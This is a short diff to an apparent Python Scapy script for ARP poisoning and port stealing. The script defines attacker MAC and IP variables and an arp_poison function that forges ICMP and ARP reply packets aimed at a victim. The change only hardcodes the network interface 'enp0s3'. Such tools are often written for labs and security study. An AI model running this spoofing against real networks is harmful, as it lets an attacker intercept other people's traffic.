@@ -16,8 +16,8 @@ DHCP_LEASE_TIME = 1800        # seconds
 PORT_STEAL_DELAY = 10         # seconds
 PORT_STEAL_SEND_DELAY = 2000  # microseconds
 
-ATTACKER_MAC = get_if_hwaddr(conf.iface)
-ATTACKER_IP = get_if_addr(conf.iface)
+ATTACKER_MAC = get_if_hwaddr("enp0s3")
+ATTACKER_IP = get_if_addr("enp0s3")
 
 poison_thread = 0
 poison_confirm_thread = 0
@@ -75,7 +75,7 @@ def arp_poison():
     print("[*] Sending ARP poison packets...")
     
     icmp = forge_l2_ping(ipToSpoof, ipVictim, macVictim)
-    sendp(icmp)
+    sendp(icmp, iface="enp0s3")
 
     arp = forge_arp(ipToSpoof, ipVictim, macVictim, ATTACKER_MAC, 2)
     sendp(arp, iface="enp0s3")
